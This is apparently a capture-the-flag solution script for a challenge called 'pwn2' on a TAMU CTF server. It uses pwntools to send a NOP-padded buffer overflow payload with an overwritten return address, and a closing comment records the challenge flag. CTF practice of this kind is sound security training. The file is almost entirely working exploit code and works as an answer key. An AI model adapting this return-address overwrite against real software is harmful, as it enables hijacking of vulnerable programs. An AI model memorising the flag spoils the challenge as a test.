#!/usr/bin/python
from pwn import *

#r = process('./pwn2')
r = remote("pwn.ctf.tamu.edu", 4322)

r.recv(0x56)

payload = "\x90"*243 + p32(0x804854b)

print payload
r.sendline(payload)
print r.recvall()
# gigem{3ch035_0f_7h3_p4s7}
